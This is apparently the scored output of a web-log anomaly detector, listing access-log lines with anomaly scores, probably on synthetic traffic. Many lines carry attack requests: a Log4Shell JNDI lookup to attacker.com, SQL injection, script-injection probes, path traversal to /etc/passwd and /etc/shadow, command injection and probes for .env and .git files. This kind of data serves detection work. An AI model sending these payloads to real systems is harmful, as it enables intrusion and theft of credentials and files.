score_content,score_session,score_fused,line
5.995682239532471,,5.995682239532471,131.242.15.233 - - [10/Jan/2025:12:04:29 +0100] "GET /?id=%24%7Bjndi%3Aldap%3A%2F%2Fattacker.com%2Fa%7D HTTP/1.1" 200 19927 "https://news.ycombinator.com/" "sqlmap/1.5.10#stable"
5.863119125366211,,5.863119125366211,4.73.89.90 - - [10/Jan/2025:12:04:30 +0100] "GET /search?q=phone HTTP/1.1" 200 12316 "https://news.ycombinator.com/" "curl/7.68.0"
2.273118734359741,,2.273118734359741,206.114.74.42 - - [10/Jan/2025:12:04:34 +0100] "GET /cgi-bin/test.cgi HTTP/1.1" 302 13718 "https://news.ycombinator.com/" "dirb/2.22"
1.7029129266738892,,1.7029129266738892,122.254.223.135 - - [10/Jan/2025:12:04:35 +0100] "GET /about HTTP/1.1" 200 10036 "-" "curl/7.68.0"
1.699577808380127,,1.699577808380127,107.45.143.119 - - [10/Jan/2025:12:04:39 +0100] "GET /about HTTP/1.1" 200 9056 "https://twitter.com/" "sqlmap/1.5.10#stable"
0.5421890616416931,,0.5421890616416931,11.211.212.78 - - [10/Jan/2025:12:04:40 +0100] "GET /.env HTTP/1.1" 200 16175 "https://news.ycombinator.com/" "python-requests/2.31.0"
5.898187160491943,,5.898187160491943,40.68.77.245 - - [10/Jan/2025:12:04:44 +0100] "GET /api/product?id=123 HTTP/1.1" 200 180 "https://news.ycombinator.com/" "sqlmap/1.5.10#stable"
5.868020534515381,,5.868020534515381,233.177.166.63 - - [10/Jan/2025:12:04:44 +0100] "GET /api/user?id=1;DROP TABLE users HTTP/1.1" 200 16218 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
1.5595595836639404,,1.5595595836639404,149.124.145.112 - - [10/Jan/2025:12:04:46 +0100] "GET /phpmyadmin HTTP/1.1" 200 11954 "https://news.ycombinator.com/" "python-requests/2.31.0"
1.6649069786071777,,1.6649069786071777,5.217.67.42 - - [10/Jan/2025:12:04:51 +0100] "GET /profile HTTP/1.1" 200 18950 "-" "python-requests/2.31.0"
0.18188391625881195,,0.18188391625881195,70.93.108.163 - - [10/Jan/2025:12:04:52 +0100] "GET /../../etc/passwd HTTP/1.1" 200 1833 "-" "sqlmap/1.5.10#stable"
1.5394257307052612,,1.5394257307052612,196.25.154.193 - - [10/Jan/2025:12:04:54 +0100] "GET /phpmyadmin HTTP/1.1" 200 6104 "https://twitter.com/" "curl/7.68.0"
1.676545262336731,,1.676545262336731,25.137.149.91 - - [10/Jan/2025:12:04:56 +0100] "GET /logout HTTP/1.1" 200 11979 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
7.854526996612549,,7.854526996612549,88.236.234.42 - - [10/Jan/2025:12:04:57 +0100] "GET /api/run?cmd=cat+%2Fetc%2Fpasswd HTTP/1.1" 304 13600 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
7.802610874176025,,7.802610874176025,158.177.213.244 - - [10/Jan/2025:12:04:58 +0100] "GET /login?user=admin&pass=admin HTTP/1.1" 304 18406 "https://news.ycombinator.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
12.808066368103027,,12.808066368103027,123.90.80.177 - - [10/Jan/2025:12:05:01 +0100] "GET /contact HTTP/1.1" 400 35 "https://www.google.com/" "curl/7.68.0"
1.580647587776184,,1.580647587776184,8.191.209.31 - - [10/Jan/2025:12:05:04 +0100] "GET /dashboard HTTP/1.1" 200 10083 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
5.704708576202393,,5.704708576202393,34.252.21.109 - - [10/Jan/2025:12:05:09 +0100] "GET /search?q=%27+OR+1%3D1+-- HTTP/1.1" 200 6976 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
5.833510875701904,,5.833510875701904,9.204.169.132 - - [10/Jan/2025:12:05:09 +0100] "GET /search?q=phone HTTP/1.1" 200 3632 "-" "python-requests/2.31.0"
5.940582752227783,,5.940582752227783,171.3.194.25 - - [10/Jan/2025:12:05:12 +0100] "GET /search?q=%3Cscript%3Ealert%281%29%3C%2Fscript%3E HTTP/1.1" 200 9984 "https://twitter.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
5.705279350280762,,5.705279350280762,8.24.38.217 - - [10/Jan/2025:12:05:13 +0100] "GET /login?user=admin&pass=admin HTTP/1.1" 200 11619 "https://twitter.com/" "python-requests/2.31.0"
5.690737724304199,,5.690737724304199,26.210.149.196 - - [10/Jan/2025:12:05:15 +0100] "GET /search?q=%27+OR+1%3D1+-- HTTP/1.1" 200 2339 "https://twitter.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
1.6929751634597778,,1.6929751634597778,2.250.186.26 - - [10/Jan/2025:12:05:16 +0100] "GET /logout HTTP/1.1" 200 17700 "https://twitter.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
0.09931283444166183,,0.09931283444166183,47.214.91.252 - - [10/Jan/2025:12:05:21 +0100] "GET /..%2f..%2fetc%2fpasswd HTTP/1.1" 200 3616 "https://news.ycombinator.com/" "dirb/2.22"
1.4813385009765625,,1.4813385009765625,32.120.29.134 - - [10/Jan/2025:12:05:22 +0100] "GET /server-status HTTP/1.1" 200 10398 "https://news.ycombinator.com/" "curl/7.68.0"
0.35889294743537903,,0.35889294743537903,30.99.73.117 - - [10/Jan/2025:12:05:24 +0100] "GET /index.html HTTP/1.1" 200 16277 "https://example.com/" "python-requests/2.31.0"
5.846306324005127,,5.846306324005127,75.253.219.110 - - [10/Jan/2025:12:05:29 +0100] "GET /search?q=camera HTTP/1.1" 200 13445 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
1.6576765775680542,,1.6576765775680542,173.27.102.113 - - [10/Jan/2025:12:05:32 +0100] "GET /profile HTTP/1.1" 200 16210 "-" "python-requests/2.31.0"
2.5448668003082275,,2.5448668003082275,190.237.229.251 - - [10/Jan/2025:12:05:32 +0100] "GET /.env HTTP/1.1" 301 3433 "-" "curl/7.68.0"
1.590999960899353,,1.590999960899353,32.60.215.109 - - [10/Jan/2025:12:05:34 +0100] "GET /dashboard HTTP/1.1" 200 13347 "https://news.ycombinator.com/" "sqlmap/1.5.10#stable"
3.7673730850219727,,3.7673730850219727,92.122.171.155 - - [10/Jan/2025:12:05:36 +0100] "GET /login HTTP/1.1" 302 13214 "https://news.ycombinator.com/" "Wget/1.20.3 (linux-gnu)"
0.20014914870262146,,0.20014914870262146,126.128.60.161 - - [10/Jan/2025:12:05:40 +0100] "GET /cgi-bin/test.cgi HTTP/1.1" 200 8314 "-" "curl/7.68.0"
1.6862581968307495,,1.6862581968307495,249.46.98.155 - - [10/Jan/2025:12:05:40 +0100] "GET /about HTTP/1.1" 200 976 "https://example.com/" "sqlmap/1.5.10#stable"
2.3908002376556396,,2.3908002376556396,197.127.203.120 - - [10/Jan/2025:12:05:41 +0100] "GET /.git/config HTTP/1.1" 302 17137 "https://example.com/" "Wget/1.20.3 (linux-gnu)"
5.963700771331787,,5.963700771331787,140.5.244.196 - - [10/Jan/2025:12:05:46 +0100] "GET /search?q=%3Cscript%3Ealert%281%29%3C%2Fscript%3E HTTP/1.1" 200 17812 "https://news.ycombinator.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
16.820402145385742,,16.820402145385742,118.10.9.46 - - [10/Jan/2025:12:05:46 +0100] "GET /api/backup?file=../../../../etc/shadow HTTP/1.1" 401 906 "https://www.google.com/" "python-requests/2.31.0"
7.923039436340332,,7.923039436340332,196.29.146.173 - - [10/Jan/2025:12:05:49 +0100] "GET /api/user?id=1;DROP TABLE users HTTP/1.1" 302 16072 "https://twitter.com/" "nikto/2.5.0"
5.950352668762207,,5.950352668762207,130.15.101.68 - - [10/Jan/2025:12:05:54 +0100] "GET /?id=%24%7Bjndi%3Aldap%3A%2F%2Fattacker.com%2Fa%7D HTTP/1.1" 200 5221 "https://twitter.com/" "nikto/2.5.0"
7.841248035430908,,7.841248035430908,83.16.8.152 - - [10/Jan/2025:12:05:57 +0100] "GET /api/run?cmd=cat+%2Fetc%2Fpasswd HTTP/1.1" 304 9420 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
3.7613730430603027,,3.7613730430603027,98.25.110.89 - - [10/Jan/2025:12:05:59 +0100] "GET /admin HTTP/1.1" 302 11282 "https://news.ycombinator.com/" "sqlmap/1.5.10#stable"
5.716341495513916,,5.716341495513916,152.22.234.177 - - [10/Jan/2025:12:06:01 +0100] "GET /search?q=%27+OR+1%3D1+-- HTTP/1.1" 200 10326 "https://example.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
1.6814239025115967,,1.6814239025115967,118.169.222.109 - - [10/Jan/2025:12:06:01 +0100] "GET /admin HTTP/1.1" 200 1324 "https://example.com/" "dirb/2.22"
569.5396118164062,,569.5396118164062,147.100.83.147 - - [10/Jan/2025:12:06:01 +0100] "GET /admin HTTP/1.1" 502 773 "https://news.ycombinator.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
5.719784259796143,,5.719784259796143,208.196.171.87 - - [10/Jan/2025:12:06:01 +0100] "GET /login?user=admin&pass=admin HTTP/1.1" 200 16574 "https://twitter.com/" "curl/7.68.0"
1.4554251432418823,,1.4554251432418823,216.218.138.55 - - [10/Jan/2025:12:06:03 +0100] "GET /server-status HTTP/1.1" 200 2568 "https://example.com/" "python-requests/2.31.0"
2.57767391204834,,2.57767391204834,184.217.149.25 - - [10/Jan/2025:12:06:03 +0100] "GET /.env HTTP/1.1" 304 3113 "https://example.com/" "sqlmap/1.5.10#stable"
5.972080707550049,,5.972080707550049,204.20.167.211 - - [10/Jan/2025:12:06:03 +0100] "GET /?id=%24%7Bjndi%3Aldap%3A%2F%2Fattacker.com%2Fa%7D HTTP/1.1" 200 11480 "https://twitter.com/" "python-requests/2.31.0"
5.826984882354736,,5.826984882354736,65.160.132.117 - - [10/Jan/2025:12:06:05 +0100] "GET /api/backup?file=../../../../etc/shadow HTTP/1.1" 200 13282 "-" "curl/7.68.0"
0.25650936365127563,,0.25650936365127563,170.247.211.191 - - [10/Jan/2025:12:06:10 +0100] "GET /assets/app.js HTTP/1.1" 200 7078 "https://example.com/" "Wget/1.20.3 (linux-gnu)"
12.552803993225098,,12.552803993225098,161.16.134.52 - - [10/Jan/2025:12:06:15 +0100] "GET /server-status HTTP/1.1" 404 1488 "https://news.ycombinator.com/" "sqlmap/1.5.10#stable"
16.83059310913086,,16.83059310913086,82.221.213.234 - - [10/Jan/2025:12:06:16 +0100] "GET /api/user?id=1;DROP TABLE users HTTP/1.1" 400 840 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
5.835038661956787,,5.835038661956787,176.154.61.104 - - [10/Jan/2025:12:06:19 +0100] "GET /api/user?id=1;DROP TABLE users HTTP/1.1" 204 8503 "-" "Wget/1.20.3 (linux-gnu)"
7.794163703918457,,7.794163703918457,119.125.144.254 - - [10/Jan/2025:12:06:20 +0100] "GET /search?q=%27+OR+1%3D1+-- HTTP/1.1" 304 10275 "https://news.ycombinator.com/" "dirb/2.22"
1.54999840259552,,1.54999840259552,8.67.203.206 - - [10/Jan/2025:12:06:25 +0100] "GET /api/products HTTP/1.1" 200 4570 "https://twitter.com/" "curl/7.68.0"
568.0460815429688,,568.0460815429688,201.6.15.221 - - [10/Jan/2025:12:06:26 +0100] "GET /wp-login.php HTTP/1.1" 500 995 "https://example.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
12.610855102539062,,12.610855102539062,230.94.172.169 - - [10/Jan/2025:12:06:30 +0100] "GET /phpmyadmin HTTP/1.1" 403 833 "https://news.ycombinator.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
5.868767261505127,,5.868767261505127,239.31.134.171 - - [10/Jan/2025:12:06:35 +0100] "GET /api/product?id=123 HTTP/1.1" 200 16492 "https://twitter.com/" "python-requests/2.31.0"
1.532363772392273,,1.532363772392273,198.207.81.85 - - [10/Jan/2025:12:06:37 +0100] "GET /phpmyadmin HTTP/1.1" 200 4106 "https://www.google.com/" "dirb/2.22"
0.3110554814338684,,0.3110554814338684,113.105.66.221 - - [10/Jan/2025:12:06:40 +0100] "GET /.git/config HTTP/1.1" 200 9096 "https://news.ycombinator.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
0.3266272246837616,,0.3266272246837616,122.175.64.247 - - [10/Jan/2025:12:06:44 +0100] "GET /.git/config HTTP/1.1" 200 13986 "https://www.google.com/" "python-requests/2.31.0"
16.913496017456055,,16.913496017456055,166.248.232.156 - - [10/Jan/2025:12:06:46 +0100] "GET /api/run?cmd=cat+%2Fetc%2Fpasswd HTTP/1.1" 400 43 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
5.857862949371338,,5.857862949371338,80.164.246.180 - - [10/Jan/2025:12:06:51 +0100] "GET /api/product?id=123 HTTP/1.1" 200 12705 "-" "curl/7.68.0"
5.8448991775512695,,5.8448991775512695,238.251.235.66 - - [10/Jan/2025:12:06:55 +0100] "GET /search?q=camera HTTP/1.1" 200 12977 "-" "curl/7.68.0"
11.195317268371582,,11.195317268371582,82.226.208.197 - - [10/Jan/2025:12:06:56 +0100] "GET /..%2f..%2fetc%2fpasswd HTTP/1.1" 404 1293 "-" "dirb/2.22"
5.779667854309082,,5.779667854309082,238.216.86.184 - - [10/Jan/2025:12:06:58 +0100] "GET /search?q=headphones HTTP/1.1" 200 13631 "-" "Wget/1.20.3 (linux-gnu)"
1.5814989805221558,,1.5814989805221558,187.209.141.189 - - [10/Jan/2025:12:06:59 +0100] "GET /phpmyadmin HTTP/1.1" 200 19830 "https://news.ycombinator.com/" "sqlmap/1.5.10#stable"
0.27357983589172363,,0.27357983589172363,162.114.203.165 - - [10/Jan/2025:12:07:04 +0100] "GET /wp-login.php HTTP/1.1" 201 6120 "-" "curl/7.68.0"
5.8251142501831055,,5.8251142501831055,29.41.64.133 - - [10/Jan/2025:12:07:07 +0100] "GET /api/user?id=1;DROP TABLE users HTTP/1.1" 200 2794 "https://twitter.com/" "curl/7.68.0"
5.797067642211914,,5.797067642211914,67.45.176.152 - - [10/Jan/2025:12:07:12 +0100] "GET /api/backup?file=../../../../etc/shadow HTTP/1.1" 200 4474 "https://example.com/" "sqlmap/1.5.10#stable"
5.773202896118164,,5.773202896118164,242.214.227.147 - - [10/Jan/2025:12:07:13 +0100] "GET /api/run?cmd=cat+%2Fetc%2Fpasswd HTTP/1.1" 200 12464 "-" "Wget/1.20.3 (linux-gnu)"
16.901329040527344,,16.901329040527344,51.68.180.219 - - [10/Jan/2025:12:07:13 +0100] "GET /api/product?id=123 HTTP/1.1" 403 947 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
5.947588920593262,,5.947588920593262,44.243.146.31 - - [10/Jan/2025:12:07:16 +0100] "GET /search?q=%3Cscript%3Ealert%281%29%3C%2Fscript%3E HTTP/1.1" 200 12156 "https://twitter.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
16.81304168701172,,16.81304168701172,31.58.183.53 - - [10/Jan/2025:12:07:19 +0100] "GET /search?q=camera HTTP/1.1" 400 1012 "https://example.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
5.82449197769165,,5.82449197769165,154.56.211.73 - - [10/Jan/2025:12:07:21 +0100] "GET /search?q=laptop HTTP/1.1" 200 6870 "https://www.google.com/" "sqlmap/1.5.10#stable"
0.2014240175485611,,0.2014240175485611,61.159.116.233 - - [10/Jan/2025:12:07:24 +0100] "GET /../../etc/passwd HTTP/1.1" 200 8678 "https://example.com/" "Wget/1.20.3 (linux-gnu)"
0.2226865142583847,,0.2226865142583847,35.224.83.250 - - [10/Jan/2025:12:07:28 +0100] "GET /cgi-bin/test.cgi HTTP/1.1" 200 15464 "https://www.google.com/" "dirb/2.22"
3.5294644832611084,,3.5294644832611084,19.25.143.16 - - [10/Jan/2025:12:07:33 +0100] "GET /server-status HTTP/1.1" 302 8496 "https://example.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
573.6178588867188,,573.6178588867188,248.206.154.182 - - [10/Jan/2025:12:07:34 +0100] "GET /api/run?cmd=cat+%2Fetc%2Fpasswd HTTP/1.1" 503 1373 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
0.5331315398216248,,0.5331315398216248,172.95.34.248 - - [10/Jan/2025:12:07:36 +0100] "GET /.env HTTP/1.1" 200 13033 "https://twitter.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
17.043842315673828,,17.043842315673828,34.23.82.182 - - [10/Jan/2025:12:07:37 +0100] "GET /?id=%24%7Bjndi%3Aldap%3A%2F%2Fattacker.com%2Fa%7D HTTP/1.1" 404 958 "https://www.google.com/" "dirb/2.22"
568.0454711914062,,568.0454711914062,224.250.214.72 - - [10/Jan/2025:12:07:39 +0100] "GET /wp-login.php HTTP/1.1" 500 1022 "https://news.ycombinator.com/" "sqlmap/1.5.10#stable"
